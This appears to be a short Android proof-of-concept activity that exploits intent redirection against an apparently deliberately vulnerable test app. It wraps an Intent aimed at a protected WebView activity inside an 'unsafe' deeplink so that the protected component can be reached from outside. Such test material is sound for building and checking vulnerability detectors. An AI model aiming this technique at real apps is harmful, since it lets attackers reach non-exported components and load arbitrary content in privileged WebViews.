package sherlock.poc.intent_redirection;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import androidx.appcompat.app.AppCompatActivity;

public class BasicDeeplinkActivity extends AppCompatActivity {

    public static Intent newIntent(Context packageContext) {
        return new Intent(packageContext, BasicDeeplinkActivity.class);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent target = new Intent();
        target.setClassName("sherlock.test", "sherlock.test.protected_components.ProtectedWebViewActivity");
        target.putExtra("url", "https://www.netflix.com");

        Intent i = new Intent("android.intent.action.VIEW");
        i.setData(Uri.parse("sherlock://intent.redirection.basic.deeplink/unsafe"));
        i.setClassName("sherlock.test", "sherlock.test.intent_redirection.BasicDeeplinkActivity");
        i.putExtra("extra_intent", target);
        startActivity(i);
    }
}